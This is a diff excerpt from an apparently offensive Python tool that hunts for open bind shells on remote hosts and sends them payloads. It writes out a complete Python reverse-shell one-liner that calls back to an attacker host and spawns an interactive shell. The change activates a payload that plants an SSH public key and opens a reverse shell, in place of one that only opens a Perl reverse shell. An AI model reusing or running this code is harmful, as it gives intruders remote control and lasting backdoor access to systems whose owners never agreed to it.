@@ -21,9 +21,9 @@ def hunt_bind_shells(r_port):
     python_reverse = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + l_host + "\"," + l_port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
     # add a pub key & a reverse shell
-    # payload = add_ssh_pub_key + "; " + python3_reverse + "\n"
+    payload = add_ssh_pub_key + "; " + python3_reverse + "\n"
     # just a reverse shell
-    payload = perl_reverse + "\n"
+    #payload = perl_reverse + "\n"
     try:
         s.connect((r_host, r_port))
         print(green + "Winner {0} {1}".format(r_host, r_port) + end_color)
